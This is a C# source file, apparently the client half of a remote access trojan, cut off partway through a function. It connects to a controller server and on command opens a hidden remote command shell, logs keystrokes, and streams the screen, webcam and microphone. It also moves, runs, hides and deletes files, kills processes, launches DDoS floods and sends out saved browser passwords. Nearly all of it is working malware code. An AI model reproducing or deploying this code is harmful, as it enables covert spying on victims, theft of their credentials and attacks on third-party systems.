using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Security.Cryptography;
using System.Management;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Drawing;
using System.Speech.Synthesis;
using UrlHistoryLibrary;
using Microsoft.Win32;
using System.Data.SQLite;

namespace TutClient
{


    class Program
    {


        public static int fps = 100;  //frame rate adjustement

       
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand,
        string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);
        [DllImport("User32.dll")]
        private static extern int FindWindowEx(int hWnd1, int hWnd2, string lpsz1, string lpsz2);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern int GetDesktopWindow();
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        private delegate bool EventHandler(CtrlType sig);
        static EventHandler _handler;

        enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        public enum errorType
        {
            FILE_NOT_FOUND = 0x00,
            PROCESS_ACCESS_DENIED = 0x01,
            ENCRYPT_DATA_CORRUPTED = 0x02,
            DECRYPT_DATA_CORRUPTED = 0x03,
            DIRECTORY_NOT_FOUND = 0x04,
            DEVICE_NOT_AVAILABLE = 0x05,
            PASSWORD_RECOVERY_FAILED = 0x06,
            CMD_STREAM_READ = 0X07,
            FILE_AND_DIR_NOT_FOUND = 0x08,
            FILE_EXISTS = 0x09,
        }

        private static bool Handler(CtrlType sig)
        {
            switch (sig)
            {
                case CtrlType.CTRL_C_EVENT:
                    sendCommand("dclient");
                    return true;
                case CtrlType.CTRL_LOGOFF_EVENT:
                    sendCommand("dclient");
                    return true;
                case CtrlType.CTRL_SHUTDOWN_EVENT:
                    sendCommand("dclient");
                    return true;
                case CtrlType.CTRL_CLOSE_EVENT:
                    sendCommand("dclient");
                    //Thread.Sleep(1000);
                    return true;
                default:
                    return false;
            }
        }
     
        [Flags]
        public enum MouseEventFlags
        {
            LEFTDOWN = 0x00000002,
            LEFTUP = 0x00000004,
            MIDDLEDOWN = 0x00000020,
            MIDDLEUP = 0x00000040,
            MOVE = 0x00000001,
            ABSOLUTE = 0x00008000,
            RIGHTDOWN = 0x00000008,
            RIGHTUP = 0x00000010


        }


        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        private static Socket _clientSocket = new Socket
            (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private const int _PORT = 100; // same as server port 

        private static StreamReader fromShell;
        private static StreamWriter toShell;
        private static StreamReader error;

        private static string fup_location = "";
        private static int fup_size = 0;
        private static bool isFileDownload = false;
        private static int writeSize = 0;
        private static byte[] recvFile = new byte[1];
        private static string fdl_location = "";
        private static bool isDisconnect = false;
        private static bool isKlThreadRunning = false;
        private static NAudio.Wave.WaveInEvent streaming;
        private static VideoCaptureDevice source;
        private static ddos DDoS;
        private static Process cmdProcess;
        private static bool applicationHidden = false;
        private static string getScreens; //get screens count
        public static int ScreenNumber = 0;

        static void Main(string[] args)
        {
            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE);
            _handler += new EventHandler(Handler);
            SetConsoleCtrlHandler(_handler, true);
            ConnectToServer();
            RequestLoop();
        }

        private static string GetIPAddress(string input)
        {
            if (input == "") return null;
            bool validIP = true;

            if (input.Contains("."))
            {
                string[] parts = input.Split('.');
                if (parts.Length == 4)
                {
                    foreach (string ipPart in parts)
                    {
                        for (int i = 0; i < ipPart.Length; i++)
                        {
                            if (!char.IsNumber(ipPart[i]))
                            {
                                validIP = false;
                                break;
                            }
                        }

                        if (!validIP)
                        {
                            Console.WriteLine("Invalid IP Address!\r\nInput is not an IP Address");
                            break;
                        }
                    }

                    if (validIP)
                    {
                        return input;
                    }
                    else
                    {
                        //Pretend that the input is a hostname
                        try
                        {
                            string ipAddr = Dns.GetHostAddresses(input)[0].ToString();
                            return ipAddr;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Dns Resolve on input: " + input + " failed\r\n" + ex.Message);
                            return null;
                        }
                    }
                }
            }

            return null;
        }

        private static void ConnectToServer()
        {
            int attempts = 0;

            while (!_clientSocket.Connected)
            {
                try
                {
                    attempts++;
                    Console.WriteLine("Connection attempt " + attempts);
                    string connectionString = GetIPAddress("192.168.0.10"); //Replace IP with DNS if you want  
                    _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
                    Thread.Sleep(500); 
                }
                catch (SocketException)
                {
                    if (RDesktop.isShutdown == false) // added this as it was still trying to send the screen after disconnection
                    {
                        RDesktop.isShutdown = true;
                    }
                    Console.Clear();
                }
            }

            Console.Clear();
            Console.WriteLine("Connected");
        }


        //Request Loop (getting command from server)

        private static void RequestLoop()
        {
            //Console.WriteLine(@"<Type ""exit"" to properly disconnect client>");

            while (true)
            {
                //SendRequest();
                if (isDisconnect) break;
                ReceiveResponse();


            }

            Console.WriteLine("Connection Ended");
            //checkServer(Decrypt(File.ReadAllLines(app + "\\config\\main.cfg")[0]));
            _clientSocket.Shutdown(SocketShutdown.Both);
            _clientSocket.Close();
            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ConnectToServer();
            isDisconnect = false;
            RequestLoop();
        }

        private static void reportError(errorType type, string title, string message)
        {
            string data = "error§" + type + "§" + title + "§" + message;
            sendCommand(data);
        }

        //ReceiveResponse

        private static void ReceiveResponse()
        {

            var buffer = new byte[2048];
            try
            {
                int received = _clientSocket.Receive(buffer, SocketFlags.None);  //this crashed here on server closing too  so added a try catch
                if (received == 0) return;
                var data = new byte[received];
                Array.Copy(buffer, data, received);



                if (isFileDownload)
                {
                    Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length);

                    writeSize += data.Length;

                    if (recvFile.Length == fup_size)
                    {
                        Console.WriteLine("Create File " + recvFile.Length);

                        using (FileStream fs = File.Create(fup_location))
                        {
                            byte[] info = recvFile;
                            // Add some information to the file.
                            fs.Write(info, 0, info.Length);
                        }

                        Array.Clear(recvFile, 0, recvFile.Length);
                        sendCommand("frecv");
                        isFileDownload = false;
                    }
                }


                if (!isFileDownload)
                {
                    string text = Encoding.Unicode.GetString(data); //unicode
                    text = Decrypt(text); //edit

                    Console.WriteLine(text);

                    if (text == "control.you")
                    {
                        sendCommand("OK! then");
                    }

                    if (text.StartsWith("getinfo-"))
                    {
                        int myid = int.Parse(text.Split('-')[1]); //get the client id
                        string allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName();
                        Console.WriteLine(allInfo);
                        string resp = "infoback;" + myid.ToString() + ";" + allInfo;
                        sendCommand(resp);
                    }

                    if (text.StartsWith("msg"))
                    {
                        createMessage(text.Split('|'));
                    }

                    if (text == "tskmgr")// i added this to start task manager
                    {
                        Process p = new Process();
                        p.StartInfo.FileName = "Taskmgr.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();
                    }



                    if (text == "fpslow")    //FPS 
                    {
                        fps = 150;
                        Console.WriteLine("FPS now 150");
                    }
                    if (text == "fpsbest")      //FPS 
                    {
                        fps = 80;
                        Console.WriteLine("FPS now 80");
                    }
                    if (text == "fpshigh")      //FPS
                    {
                        fps = 50;
                        Console.WriteLine("FPS now 50");
                    }
                    if (text == "fpsmid")      //FPS 
                    {
                        fps = 100;
                        Console.WriteLine("FPS now 100");
                    }

                    if (text.StartsWith("freq-"))  //function sounds
                    {
                        int freq = int.Parse(text.Split('-')[1]);
                        generateFreq(freq, 2); //Duration in seconds
                    }

                    if (text.StartsWith("sound-")) 
                    {
                        string snd = text.Split('-')[1];
                        System.Media.SystemSound sound = System.Media.SystemSounds.Asterisk;

                        switch (snd)
                        {
                            case "0":
                                sound = System.Media.SystemSounds.Beep;
                                break;

                            case "1":
                                sound = System.Media.SystemSounds.Hand;
                                break;

                            case "2":
                                sound = System.Media.SystemSounds.Exclamation;
                                break;

                            case "3":
                                sound = System.Media.SystemSounds.Asterisk;
                                break;
                        }

                        sound.Play();
                    }

                    /* if (text.StartsWith("ts2|"))*/  
                    if (text.StartsWith("t2s|")) 
                    {
                        string txt = text.Split('|')[1];
                        t2s(txt);
                    }

                    if (text.StartsWith("cd|"))    
                    {
                        string opt = text.Split('|')[1];

                        if (opt == "open")
                        {
                            mciSendStringA("set CDAudio door open", "", 127, 0);
                        }
                        else
                        {
                            mciSendStringA("set CDAudio door closed", "", 127, 0);
                        }
                    }

                    if (text.StartsWith("emt|"))         
                    {
                        string action = text.Split('|')[1];
                        string element = text.Split('|')[2];

                        switch (element)
                        {
                            case "task":

                                if (action == "hide")
                                {
                                    hTaskBar();
                                }
                                else
                                {
                                    sTaskBar();
                                }

                                break;

                            case "clock":

                                if (action == "hide")
                                {
                                    hClock();
                                }
                                else
                                {
                                    sClock();
                                }

                                break;

                            case "tray":

                                if (action == "hide")
                                {
                                    hTrayIcons();
                                }
                                else
                                {
                                    sTrayIcons();
                                }

                                break;

                            case "desktop":

                                if (action == "hide")
                                {
                                    hDesktop();
                                }
                                else
                                {
                                    sDesktop();
                                }

                                break;

                            case "start":

                                if (action == "hide")
                                {
                                    hStart();
                                }
                                else
                                {
                                    sStart();
                                }

                                break;
                        }
                    }

                    if (text == "proclist")
                    {
                        Process[] allProcess = Process.GetProcesses();
                        string dataString = "";

                        foreach (Process proc in allProcess)
                        {
                            string name = proc.ProcessName;
                            string id = proc.Id.ToString();
                            string responding = proc.Responding.ToString();
                            string title = proc.MainWindowTitle;
                            string priority = "N/A";
                            string path = "N/A";

                            if (title == "") title = "N/A";

                            try
                            {
                                priority = proc.PriorityClass.ToString();
                                path = proc.Modules[0].FileName;
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("List error: " + e.Message);
                            }
                            try
                            {
                                string pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id; //this was crashing the client
                                dataString += pdata + "\n";

                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("List error: " + ex.Message);
                            }


                            //sendCommand(pdata);
                            //System.Threading.Thread.Sleep(100);
                        }

                        sendCommand(dataString);
                    }

                    if (text.StartsWith("prockill"))
                    {
                        string id = text.Split('|')[1];
                        try
                        {
                            Process.GetProcessById(int.Parse(id)).Kill();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                            reportError(errorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id);
                        }
                    }

                    if (text.StartsWith("procstart"))
                    {
                        try
                        {
                            string file = text.Split('|')[1];
                            string state = text.Split('|')[2];

                            Process p = new Process();

                            switch (state)
                            {
                                case "Normal":
                                    p.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                                    break;

                                case "Hidden":
                                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    break;
                            }

                            p.StartInfo.FileName = file;
                            p.Start();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }
                    }

                    if (text == "startcmd")
                    {
                        ProcessStartInfo info = new ProcessStartInfo();

                        info.FileName = "cmd.exe";
                        info.CreateNoWindow = true;
                        info.UseShellExecute = false;
                        info.RedirectStandardInput = true;
                        info.RedirectStandardOutput = true;
                        info.RedirectStandardError = true;

                        Process p = new Process();

                        p.StartInfo = info;
                        p.Start();
                        cmdProcess = p;
                        toShell = p.StandardInput;
                        fromShell = p.StandardOutput;
                        error = p.StandardError;
                        toShell.AutoFlush = true;

                        Thread shellTherad = new Thread(new ThreadStart(getShellInput));
                        shellTherad.Start();
                    }

                    if (text == "stopcmd")
                    {
                        cmdProcess.Kill();
                        toShell.Dispose();
                        toShell = null;
                        fromShell.Dispose();
                        fromShell = null;
                        cmdProcess.Dispose();
                        cmdProcess = null;
                    }

                    if (text.StartsWith("cmd§"))
                    {
                        string command = text.Split('§')[1];
                        toShell.WriteLine(command + "\r\n");
                    }

                    if (text == "fdrive")
                    {
                        DriveInfo[] drives = DriveInfo.GetDrives();

                        string info = "";

                        foreach (DriveInfo d in drives)
                        {
                            if (d.IsReady)
                            {
                                info += d.Name + "|" + d.TotalSize + "\n";
                            }
                            else
                            {
                                info += d.Name + "\n";
                            }
                        }

                        string resp = "fdrivel§" + info;
                        sendCommand(resp);
                    }

                    if (text.StartsWith("fdir§"))
                    {
                        string path = text.Split('§')[1];
                        Console.WriteLine(path);
                        bool passed = false;
                        if (path.Length == 3 && path.Contains(":\\"))
                        {
                            passed = true;
                        }
                        if (!passed && Directory.Exists(path))
                        {
                            passed = true;
                        }
                        if (!passed)
                        {
                            reportError(errorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path);
                            return;
                        }
                        Console.WriteLine("Valid = true");
                        string[] directories = Directory.GetDirectories(path);
                        string[] files = Directory.GetFiles(path);
                        List<string> dir = new List<string>();
                        List<string> file = new List<string>();
                        string fi = "";
                        string di = "";

                        foreach (string d in directories)
                        {
                            string size = "N/A";
                            string name = d.Replace(path, "");
                            string crtime = Directory.GetCreationTime(d).ToString();
                            string pth = d;
                            string cont = name + "§" + size + "§" + crtime + "§" + pth;
                            dir.Add(cont);
                        }

                        foreach (string f in files)
                        {
                            string size = new FileInfo(f).Length.ToString();
                            string name = Path.GetFileName(f);
                            string crtime = File.GetCreationTime(f).ToString();
                            string pth = f;
                            string cont = name + "§" + size + "§" + crtime + "§" + pth;
                            file.Add(cont);
                        }

                        foreach (string c in dir)
                        {
                            di += c + "\n";
                        }

                        foreach (string f in file)
                        {
                            fi += f + "\n";
                        }

                        string final = di + fi;
                        sendCommand("fdirl" + final);
                    }

                    if (text.StartsWith("f1§"))
                    {
                        string current = text.Split('§')[1];
                        Console.WriteLine(current);

                        if (current.Length == 3 && current.Contains(":\\"))
                        {
                            sendCommand("f1§drive");
                        }
                        else
                        {
                            string parent = new DirectoryInfo(current).Parent.FullName;
                            Console.WriteLine(parent);
                            sendCommand("f1§" + parent);
                        }
                    }

                    if (text.StartsWith("fpaste§"))
                    {
                        string source = text.Split('§')[2];
                        string target = text.Split('§')[1];
                        string mode = text.Split('§')[3];
                        string sourceType = "file";
                        if (!Directory.Exists(target))
                        {
                            reportError(errorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager");
                            return;
                        }

                        if (Directory.Exists(source)) sourceType = "dir";
                        switch (sourceType)
                        {
                            case "dir":
                                if (mode == "1")
                                {
                                    //Copy Directory
                                    string name = new DirectoryInfo(source).Name;
                                    Directory.CreateDirectory(target + "\\" + name);
                                    DirectoryCopy(source, target + "\\" + name, true);
                                }

                                if (mode == "2")
                                {
                                    //Move Directory
                                    string name = new DirectoryInfo(source).Name;
                                    Directory.CreateDirectory(target + "\\" + name);
                                    DirectoryMove(source, target + "\\" + name, true);
                                }
                                break;

                            case "file":
                                if (mode == "1")
                                {
                                    //Copy File
                                    File.Copy(source, target + "\\" + new FileInfo(source).Name, true);
                                }
                                if (mode == "2")
                                {
                                    //Move File
                                    File.Move(source, target + "\\" + new FileInfo(source).Name);
                                }
                                break;
                        }
                    }

                    if (text.StartsWith("fexec§"))
                    {
                        string path = text.Split('§')[1];
                        bool valid = false;
                        if (File.Exists(path)) valid = true;
                        if (Directory.Exists(path)) valid = true;
                        if (!valid)
                        {
                            reportError(errorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager");
                            return;
                        }
                        Process.Start(path);
                    }

                    if (text.StartsWith("fhide§"))
                    {
                        string path = text.Split('§')[1];
                        bool valid = false;
                        if (File.Exists(path)) valid = true;
                        if (Directory.Exists(path)) valid = true;
                        if (!valid)
                        {
                            reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
                            return;
                        }
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }

                    if (text.StartsWith("fshow§"))
                    {
                        string path = text.Split('§')[1];
                        bool valid = false;
                        if (File.Exists(path)) valid = true;
                        if (Directory.Exists(path)) valid = true;
                        if (!valid)
                        {
                            reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
                            return;
                        }
                        File.SetAttributes(path, FileAttributes.Normal);
                    }

                    if (text.StartsWith("fdel§"))
                    {
                        string path = text.Split('§')[1];
                        if (Directory.Exists(path))
                        {
                            Directory.Delete(path, true);
                        }
                        else if (File.Exists(path))
                        {
                            File.Delete(path);
                        }
                        else
                        {
                            reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path);
                        }
                    }

                    if (text.StartsWith("frename§"))
                    {
                        string path = text.Split('§')[1];
                        string name = text.Split('§')[2];
                        bool isDir = false;
                        string target = "";
                        if (Directory.Exists(path)) isDir = true;
                        if (isDir)
                        {
                            target = new DirectoryInfo(path).Parent.FullName + "\\" + name;
                            Directory.Move(path, target);
                        }
                        else
                        {
                            if (!File.Exists(path))
                            {
                                reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path);
                                return;
                            }
                            target = new FileInfo(path).Directory.FullName + "\\" + name;
                            File.Move(path, target);
                        }
                    }

                    if (text.StartsWith("ffile§"))
                    {
                        string path = text.Split('§')[1];
                        string name = text.Split('§')[2];
                        string fullPath = path + "\\" + name;

                        //Overwrite existing
                        if (File.Exists(path)) File.Delete(path);

                        using (FileStream fs = File.Create(fullPath))
                        {
                            byte[] info = new UTF8Encoding(true).GetBytes("");
                            // Add some information to the file.
                            fs.Write(info, 0, info.Length);
                        }
                    }
                    if (text.StartsWith("fndir§"))
                    {
                        string path = text.Split('§')[1];
                        string name = text.Split('§')[2];
                        string fullPath = path + "\\" + name;
                        //Overwrite existing
                        if (Directory.Exists(path)) Directory.Delete(path, true);

                        Directory.CreateDirectory(fullPath);
                    }
                    if (text.StartsWith("getfile§"))
                    {
                        string path = text.Split('§')[1];
                        if (!File.Exists(path))
                        {
                            reportError(errorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path);
                            return;
                        }
                        string content = File.ReadAllText(path);
                        string back = "backfile§" + content;
                        sendCommand(back);
                    }
                    if (text.StartsWith("putfile§"))
                    {
                        string path = text.Split('§')[1];
                        string content = text.Split('§')[2];

                        if (!File.Exists(path))
                        {
                            reportError(errorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path);
                            return;
                        }
                        File.WriteAllText(path, content);
                    }
                    if (text.StartsWith("fup"))
                    {
                        string location = text.Split('§')[1];
                        if (File.Exists(location)) //prev. !File.Exists(location) -> bug
                        {
                            reportError(errorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!");
                            return;
                        }
                        int size = int.Parse(text.Split('§')[2]);
                        fup_location = location;
                        fup_size = size;
                        isFileDownload = true;
                        recvFile = new byte[fup_size];
                        sendCommand("fconfirm");
                    }
                    if (text.StartsWith("fdl§"))
                    {
                        string file = text.Split('§')[1];
                        if (!File.Exists(file))
                        {
                            reportError(errorType.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + file);
                            return;
                        }
                        string size = new FileInfo(file).Length.ToString();
                        fdl_location = file;
                        sendCommand("finfo§" + size);
                    }
                    if (text == "fconfirm")
                    {
                        byte[] sendFile = File.ReadAllBytes(fdl_location);
                        sendByte(sendFile);
                    }
                    if (text == "dc") //this disconnects from the server and tries to connect again
                    {
                        Thread.Sleep(2000);  //this was 3000
                        isDisconnect = true;

                    }
                    if (text == "sklog")   //dont need this function KEYLOGGER
                    {
                        if (!isKlThreadRunning)
                        {
                            Thread t = new Thread(new ThreadStart(Keylogger.Logger));
                            t.Start();
                            isKlThreadRunning = true;
                        }
                        if (isKlThreadRunning && !Keylogger.letRun)
                        {
                            Keylogger.letRun = true;
                        }

                    }
                    if (text == "stklog")
                    {
                        if (isKlThreadRunning && Keylogger.letRun) Keylogger.letRun = false;
                    }
                    if (text == "rklog")
                    {
                        string dump = Keylogger.KeyLog;
                        sendCommand("putklog" + dump);
                    }
                    if (text == "cklog")
                    {
                        Keylogger.LastWindow = "";
                        Keylogger.KeyLog = "";
                    }
                    if (text == "rdstart")
                    {
                        Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen));
                        RDesktop.isShutdown = false;
                        rd.Start();
                    }
                    if (text == "rdstop")
                    {
                        RDesktop.isShutdown = true;
                    }
                    if (text.StartsWith("rmove-"))
                    {
                        string[] t = text.Split('-');
                        string[] x = t[1].Split(':');
                        Cursor.Position = new Point(int.Parse(x[0]), int.Parse(x[1]));
                    }
                    if (text.StartsWith("rtype-"))
                    {

                        //Console.WriteLine("received write command");
                        string[] t = text.Split('-');
                        if (t[1] != "rtype")
                        {

                            SendKeys.SendWait(t[1]);

                            SendKeys.Flush();

                        }

                    }
                    if (text.StartsWith("rclick-"))
                    {
                        string[] t = text.Split('-');
                        MouseEvent(t[1], t[2]);
                        //Cursor.Position = new System.Drawing.Point(729, 182);
                    }
                    if (text == "alist")       
                    {
                        List<NAudio.Wave.WaveInCapabilities> source = new List<NAudio.Wave.WaveInCapabilities>();
                        string send = "";

                        for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++)
                        {
                            source.Add(NAudio.Wave.WaveIn.GetCapabilities(i));
                        }

                        foreach (var src in source)
                        {
                            send += src.ProductName + "|" + src.Channels.ToString() + "§";
                        }

                        send = send.Substring(0, send.Length - 1);
                        send = "alist" + send;
                        sendCommand(send);
                    }

                    if (text.StartsWith("astream"))
                    {
                        try
                        {
                            string devNum = text.Split('§')[1];
                            int deviceNumber = int.Parse(devNum);
                            NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent();
                            audioSource.DeviceNumber = deviceNumber;
                            audioSource.WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels);
                            audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(sendAudio);
                            streaming = audioSource;
                            audioSource.StartRecording();
                        }
                        catch (Exception)
                        {
                            reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!");
                        }
                    }
                    if (text == "astop")
                    {
                        streaming.StopRecording();
                        streaming.Dispose();
                        streaming = null;
                    }  
                    if (text == "wlist")   //webcam
                    {
                        string captureDevices = "";
                        FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        int i = 0;

                        foreach (FilterInfo device in devices)
                        {
                            captureDevices += i.ToString() + "|" + device.Name + "§";
                            i++;
                        }

                        if (captureDevices != "") captureDevices = captureDevices.Substring(0, captureDevices.Length - 1); //remove the split char ('§') from the end
                        sendCommand("wlist" + captureDevices);
                    }
                    if (text.StartsWith("wstream"))
                    {
                        int id = int.Parse(text.Split('§')[1]);

                        FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        if (devices.Count == 0)
                        {
                            reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", "The selected device is not found!");
                            return;
                        }
                        int i = 0;
                        FilterInfo dName = new FilterInfo("");

                        foreach (FilterInfo device in devices)
                        {
                            if (i == id)
                            {
                                dName = device;
                            }
                            i++;
                        }

                        Console.WriteLine(dName.Name);

                        source = new VideoCaptureDevice(dName.MonikerString);
                        source.NewFrame += new NewFrameEventHandler(source_NewFrame);
                        source.Start();
                    }
                    if (text == "wstop")
                    {
                        source.Stop();
                        source = null;
                    }
                    if (text.StartsWith("ddosr"))   //DDOS
                    {
                        string[] p = text.Split('|');
                        string ip = p[1];
                        string port = p[2];
                        string protocol = p[3];
                        string packetSize = p[4];
                        string threads = p[5];
                        string delay = p[6];

                        DDoS = new ddos(ip, port, protocol, packetSize, threads, delay);
                        DDoS.startDdos();
                    }

                    if (text.StartsWith("ddosk"))
                    {
                        DDoS.stopDdos();
                    }

                    if (text == "getpw")   // password recovery
                    {
                        bool validOperation = true;
                        string app = Application.StartupPath;
                        if (!File.Exists(app + "\\ff.exe"))
                        {
                            validOperation = false;
                        }

                        if (validOperation)
                        {
                            passwordManager pm = new passwordManager();
                            string[] passwd = pm.getSavedPassword();
                            string gcpw = "gcpw\n" + passwd[0];
                            string iepw = "iepw\n" + passwd[1];
                            string ffpw = "ffpw\n" + passwd[2];
                            sendCommand(iepw);
                            Console.WriteLine("iepw sent");
                            Thread.Sleep(1000);
                            sendCommand(gcpw);
                            Console.WriteLine("gcpw sent");
                            Thread.Sleep(1000);
                            sendCommand(ffpw);
                            Console.WriteLine("ffpw sent");
                            pm = null;
                            gcpw = null;
                            iepw = null;
                            ffpw = null;
                            return;
                        }
                        else
                        {
                            sendCommand("getpwu");
                            reportError(errorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!");
                            /*if (isgetpwu) return;
                            sendCommand("getpwu");
                            isgetpwu = true;
                            WebClient wc = new WebClient();
                            wc.DownloadFile("http://www.nirsoft.net/toolsdownload/passwordfox.zip", app + "\\ffcp.zip");
                            System.IO.Compression.ZipFile.ExtractToDirectory(app + "\\ffcp.zip", app + "\\ffex");
                            System.IO.File.Copy(app + "\\ffex\\PasswordFox.exe", app + "\\ff.exe");
                            System.IO.Directory.Delete(app + "\\ffex");
                            System.IO.File.Delete(app + "\\ffcp.zip");
                            isgetpwu = false;*/
                        }
                    }

                    if (text == "getstart")
                    {
                        string app = Application.StartupPath;
                        sendCommand("setstart§" + app);
                    }


                    if (text == "countScreens")//-----------------added this to count the screens and send response to server
                    {

                        foreach (var screen in Screen.AllScreens)
                        {
                            getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", "");

                            sendCommand("ScreenCount" + getScreens);
                        }
                    }

                    if (text.StartsWith("screenNum"))//----------this will set the screen else is equal to screen 0
                    {
                        int screenNumbers = int.Parse(text.Replace("screenNum", "")) - 1; //because the screens start at 0 not 1 
                        ScreenNumber = screenNumbers;
                        Console.WriteLine(ScreenNumber.ToString());
                    }

                }
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.Message);  //-added this try catch after it crashed when server crashed
                RDesktop.isShutdown = true;     //--added this try catch after it crashed when server crashed

                Console.WriteLine("Connection Ended");

            }
        }

        private static void source_NewFrame(object sender, NewFrameEventArgs e)  // i added all the try catches here as it was causing issues should the connection be lost
        {

            try
            {

                Bitmap cam = (Bitmap)e.Frame.Clone();

                ImageConverter convert = new ImageConverter();
                byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(byte[]));
                byte[] send = new byte[camBuffer.Length + 16];
                byte[] header = Encoding.Unicode.GetBytes("wcstream");
                Buffer.BlockCopy(header, 0, send, 0, header.Length);
                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length);
                Console.WriteLine("Size of send: " + send.Length);
                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
                Application.DoEvents();
                Thread.Sleep(200); //this was 500
                cam.Dispose();
            }
            catch
            {
                try
                {
                    Console.WriteLine("Connection Ended");
                    Thread.Sleep(3000);
                    isDisconnect = true;
                    // return;
                }
                catch (Exception exc)
                {

                    Console.WriteLine("Failed to send New Frame  original ERROR : " + exc.Message);
                    Thread.Sleep(10000);
                    Application.Restart();
                    return;
                }

            }
        }

        private static void sendAudio(object sender, NAudio.Wave.WaveInEventArgs e)  //AUDIO
        {
            byte[] rawAudio = e.Buffer;
            Console.WriteLine("Size of the audio: " + rawAudio.Length);
            byte[] send = new byte[rawAudio.Length + 16];
            byte[] header = Encoding.Unicode.GetBytes("austream");
            Buffer.BlockCopy(header, 0, send, 0, header.Length);
            Buffer.BlockCopy(rawAudio, 0, send, header.Length, rawAudio.Length);
            Console.WriteLine("Size of send: " + send.Length);
            _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
        }

        public static void SendScreen(byte[] img)// i added all the try catches here as it was causing issues should the connection be lost
        {
            try
            {

                Console.WriteLine("Size of the image: " + img.Length);
                byte[] send = new byte[img.Length + 16];
                byte[] header = Encoding.Unicode.GetBytes("rdstream");
                Buffer.BlockCopy(header, 0, send, 0, header.Length);
                Buffer.BlockCopy(img, 0, send, header.Length, img.Length);
                Console.WriteLine("Size of send: " + send.Length);

                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Connection Ended");

                //checkServer(Decrypt(File.ReadAllLines(app + "\\config\\main.cfg")[0]));
                try
                {
                    Thread.Sleep(3000);
                    isDisconnect = true;

                }
                catch (Exception e)
                {
                    //_clientSocket.Close();
                    Console.WriteLine("Failed To send Screen  original ERROR : " + e.Message);
                    Thread.Sleep(10000);
                    Application.Restart();

                }

            }
        }

        private static void MouseEvent(string button, string direction)

        {
            int X = Cursor.Position.X;
            int Y = Cursor.Position.Y;


            switch (button)
            {
                case "left":
                    if (direction == "up")
                    {

                        mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
                        Console.WriteLine("mouseevent leftup");
                    }

                    else
                    {


                        mouse_eventLeftDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
                        Console.WriteLine("mouseevent leftdown");
                    }

                    break;

                case "right":
                    if (direction == "up")
                    {

